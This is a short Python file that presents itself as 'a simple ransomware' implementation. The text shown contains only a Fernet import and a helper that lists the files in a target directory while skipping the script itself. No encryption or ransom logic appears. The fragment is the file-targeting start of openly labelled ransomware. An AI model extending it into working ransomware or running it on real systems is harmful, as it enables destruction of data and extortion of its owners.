#!/usr/bin/env python3

"""Implementation of a simple ransomware with Python."""

import os
import sys
import logging
from cryptography.fernet import Fernet


def list_files(dir_name="target_dir"):
    """ Get a list of files in a given directory.

        Parameters: 
            dir_name (str): Name of the target directory. Defaults to 'target_dir'.

        Returns:
            files (list): List of all files in the target directory.
    """
    if not os.path.isdir(dir_name):
        logging.critical("The directory given for query doesn't exist.")
        sys.exit(1)

    files = []
    for file_name in os.listdir(dir_name):
        # ignore this file
        if file_name == sys.argv[0]:
            continue

        file_path = os.path.join(dir_name, file_name)
        if os.path.isfile(file_path):
            files.append(file_path)

    return files


# files = list_files()



